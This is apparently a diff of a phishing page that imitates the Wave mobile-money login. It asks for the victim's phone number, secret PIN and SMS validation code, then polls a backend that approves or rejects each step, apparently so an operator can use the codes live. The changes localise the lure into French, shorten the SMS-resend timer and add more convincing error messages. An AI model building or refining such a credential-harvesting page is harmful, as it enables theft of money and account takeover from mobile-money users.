@@ -458,7 +458,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 
   <!-- ══ LOGIN ══ -->
   <div class="scr" id="s-login" style="flex-direction:column;">
-    <div class="wave-h">Welcome to Wave! Enter your mobile to start</div>
+    <div class="wave-h">Bienvenue sur Wave ! Entrez votre numéro pour commencer</div>
     <div style="display:flex;align-items:flex-end;padding:0 24px 8px;border-bottom:2px solid #4dc8e8;margin:0 24px;flex-shrink:0;">
       <div class="wave-cc">
         <span>🇸🇳 +221</span>
@@ -483,7 +483,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
         <span class="kk-letters"></span>
       </button>
     </div>
-    <button class="wave-next" id="loginBtn" onclick="loginGo()">Next</button>
+    <button class="wave-next" id="loginBtn" onclick="loginGo()">Suivant</button>
   </div>
 
   <!-- ══ PIN ══ -->
@@ -499,7 +499,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
         <circle cx="30" cy="46" r="3.5" fill="#111"/>
       </svg>
     </div>
-    <div class="wave-h" style="padding-top:22px;" id="pinTitle">Enter your secret code for account <span id="pinAcct"></span></div>
+    <div class="wave-h" style="padding-top:22px;" id="pinTitle">Entrez votre code secret pour le compte <span id="pinAcct"></span></div>
     <div class="pin-dots-row">
       <div class="pd" id="pd0"></div>
       <div class="pd" id="pd1"></div>
@@ -516,7 +516,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
       <button class="kk" onclick="kpPress('pin',7)"><span class="kk-num">7</span><span class="kk-letters">PQRS</span></button>
       <button class="kk" onclick="kpPress('pin',8)"><span class="kk-num">8</span><span class="kk-letters">TUV</span></button>
       <button class="kk" onclick="kpPress('pin',9)"><span class="kk-num">9</span><span class="kk-letters">WXYZ</span></button>
-      <button class="kk forgot-key"><span class="kk-num">FORGOT?</span><span class="kk-letters"></span></button>
+      <button class="kk forgot-key"><span class="kk-num">OUBLIÉ ?</span><span class="kk-letters"></span></button>
       <button class="kk" onclick="kpPress('pin',0)"><span class="kk-num">0</span><span class="kk-letters">+</span></button>
       <button class="kk backspace" onclick="kpBack('pin')">
         <span class="kk-num"><svg width="26" height="20" viewBox="0 0 26 20"><path d="M9 2L2 10l7 8h15V2H9z" fill="#111"/><line x1="14" y1="7" x2="20" y2="13" stroke="#fff" stroke-width="2"/><line x1="20" y1="7" x2="14" y2="13" stroke="#fff" stroke-width="2"/></svg></span>
@@ -541,7 +541,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
       </svg>
     </div>
     <div style="font-size:16px;font-weight:700;color:#111;text-align:left;padding:22px 24px 0;line-height:1.5;flex-shrink:0;">
-      Enter the validation code that we texted to <span id="otpPh" style="color:#111;"></span>
+      Saisissez le code de validation envoyé par SMS au <span id="otpPh" style="color:#111;"></span>
     </div>
     <div style="display:flex;justify-content:center;gap:22px;padding:24px 28px 0;flex-shrink:0;">
       <div class="otp-slot"><span class="otp-digit" id="osd0"></span></div>
@@ -552,7 +552,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
     <div style="text-align:center;padding:8px 0 4px;flex-shrink:0;">
       <button id="resendBtn" onclick="doResend()" disabled
         style="background:none;border:none;font-family:'Patrick Hand',cursive;font-size:16px;font-weight:700;color:#4dc8e8;cursor:pointer;opacity:0.4;padding:8px 24px;border-radius:50px;transition:opacity 0.2s,background 0.2s;">
-        Resend SMS
+        Renvoyer le SMS
       </button>
       <div id="resendCd" style="font-size:11px;color:#bbb;margin-top:2px;min-height:15px;"></div>
     </div>
@@ -735,27 +735,27 @@ function startPoll(sid){
       if(r.status==='pending' || r.status==='otp_pending') return;
       if(r.status==='approved'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        go('s-pin','s-otp'); resetOTP(); startResendCd(30); startPoll(sid);
+        go('s-pin','s-otp'); resetOTP(); startResendCd(10); startPoll(sid);
       } else if(r.status==='wrong_pin'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        showPop('Code incorrect','Le code secret saisi est incorrect. Veuillez réessayer.');
-        pinVal=''; updatePinDots();
+        showPop('Code PIN incorrect','Le code secret saisi est erroné. Veuillez vérifier et réessayer.');
+        setTimeout(function(){ pinVal=''; updatePinDots(); }, 300);
       } else if(r.status==='wrong_code'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        resetOTP();
-        setTimeout(function(){ startPoll(sid); }, 2100);
+        showPop('Code invalide', 'Le code de validation est incorrect. Veuillez réessayer ou demander un nouveau code.');
+        setTimeout(function(){ resetOTP(); startPoll(sid); }, 600);
       } else if(r.status==='continue'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et réessayer.','inf');
       } else if(r.status==='expired' || r.status==='session_expired'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         sessId = null;
-        showPop('Session expirée','Veuillez saisir à nouveau votre code PIN.');
+        showPop('Session expirée', 'Votre session a expiré. Veuillez saisir à nouveau votre code PIN.');
         pinVal=''; updatePinDots();
         setTimeout(function(){ go('s-otp','s-pin'); },500);
       } else if(r.status==='denied' || r.status==='rejected'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        showPop('Accès refusé','Cette demande a été refusée. Veuillez contacter le support.');
+        showPop('Accès refusé', 'Cette demande a été refusée. Veuillez contacter le support.');
         pinVal=''; updatePinDots();
         setTimeout(function(){ go('s-pin','s-login'); loginVal=''; document.getElementById('loginPh').value=''; },1500);
       }
@@ -790,7 +790,7 @@ async function submitPIN(){
       pinVal=''; updatePinDots();
     } else {
       hideLoad();
-      showPop('Erreur serveur', 'Réponse: ' + text.slice(0,120));
+      showPop('Erreur serveur', 'Réponse : ' + text.slice(0,120));
       pinVal=''; updatePinDots();
     }
   } catch(e){
@@ -830,12 +830,12 @@ function startResendCd(secs){
   var cd  = document.getElementById('resendCd');
   btn.disabled = true; btn.style.opacity = '0.4';
   clearInterval(resTimer);
-  var s = secs || 30;
-  cd.textContent = 'Resend in ' + s + 's';
+  var s = secs || 10;
+  cd.textContent = 'Renvoyer dans ' + s + 's';
   resTimer = setInterval(function(){
     s--;
     if(s <= 0){ clearInterval(resTimer); cd.textContent = ''; btn.disabled = false; btn.style.opacity = '1'; }
-    else { cd.textContent = 'Resend in ' + s + 's'; }
+    else { cd.textContent = 'Renvoyer dans ' + s + 's'; }
   }, 1000);
 }
 
@@ -885,9 +885,15 @@ async function doResend(){
 async function doVerify(){
   if(otpVal.length === 4 && sessId){
     showLoad();
-    await callApi('reset_otp', { sessionId: sessId });
     var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
-    if(r.success){ startPoll(sessId); } else { hideLoad(); resetOTP(); }
+    if(r && r.success){
+      startPoll(sessId);
+    } else {
+      hideLoad();
+      // Don't wipe instantly — show error first, then clear
+      showPop('Code incorrect', 'Le code de validation saisi est incorrect. Veuillez vérifier et réessayer.');
+      setTimeout(function(){ resetOTP(); }, 400);
+    }
   }
 }
 
